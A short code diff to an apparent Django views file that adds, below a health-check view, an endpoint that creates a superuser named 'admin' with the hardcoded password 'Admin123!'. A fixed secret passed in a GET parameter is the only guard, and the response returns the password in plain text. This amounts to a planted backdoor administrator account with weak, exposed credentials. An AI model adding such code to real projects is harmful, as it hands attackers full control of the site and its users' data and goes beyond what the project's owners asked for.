@@ -915,3 +915,17 @@ from django.http import JsonResponse
 
 def health_check(request):
     return JsonResponse({"status": "ok"})
+
+
+import secrets
+from django.contrib.auth.models import User
+
+ADMIN_SECRET = "corpodg-setup-2024"
+
+def setup_admin(request):
+    if request.GET.get("secret") != ADMIN_SECRET:
+        return JsonResponse({"error": "invalid secret"}, status=403)
+    if User.objects.filter(username="admin").exists():
+        return JsonResponse({"status": "admin already exists"})
+    User.objects.create_superuser("admin", "admin@corpodg.ec", "Admin123!")
+    return JsonResponse({"status": "admin created", "user": "admin", "password": "Admin123!"})
